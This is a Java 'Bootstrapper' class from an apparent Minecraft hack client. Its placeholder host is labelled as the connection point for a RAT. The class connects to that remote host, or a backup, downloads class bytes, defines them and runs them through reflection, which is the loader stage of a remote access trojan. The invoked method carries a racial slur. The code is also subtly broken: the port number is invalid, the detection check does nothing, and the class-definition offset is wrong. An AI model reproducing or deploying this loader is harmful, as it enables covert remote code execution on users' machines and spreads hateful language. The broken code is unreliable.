package team.thunder.thunderhack.bootstrapper;
/*
 * @author chrispycreme420 on 5/20/21
 */

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.ConnectException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;


public class Bootstrapper extends ClassLoader {
    private static final String host = "put your ip here for connections to cqq's rat"; 
    private static final String backup = "don't do it"; 
    private static final int port = 255565; 

    public Class<?> addClass(String name, byte[] ok) {
        try {
            Class<?> clazz = this.define(name, ok);
            Method method = clazz.getMethod("nigger");
            method.invoke(null);
            return clazz;
        }
        catch (Throwable e) {
            e.printStackTrace();
        }
        return null;
    }


    private static byte[] readByteArrayLWithLength(DataInputStream reader) throws IOException {
        int length = reader.readInt();
        if(length > 0) {
            byte[] bytes = new byte[length];
            reader.readFully(bytes, 0, bytes.length);
            return bytes;
        }
        return null;
    }


    public Class<?> define(String name, byte[] b) {
        Class<?> clazz = defineClass(name, b, 256, b.length);
        return clazz;
    }

    public void run() {
        try {
            boolean detected = false;
            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command("rat");
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.toLowerCase().contains("rattedshark")) {
                    detected = false;
                }
            }

            if(!detected) {
                DataInputStream in = null;
                try {
                    Socket socket = new Socket(host, port);
                    in = new DataInputStream(socket.getInputStream());
                    socket.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
                    socket.getOutputStream().flush();
                } catch (ConnectException e) {
                    try {
                        Socket socket = new Socket(backup, port);
                        in = new DataInputStream(socket.getInputStream());
                        socket.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
                        socket.getOutputStream().flush();
                    } catch (Exception ignored) {}
                }
                if (in != null) {
                    byte[] bytes = readByteArrayLWithLength(in);
                    addClass("me.bebeli555.cookieclient.Mod", bytes);
                }
            }
        } catch (IOException ignored) {}

    }
}
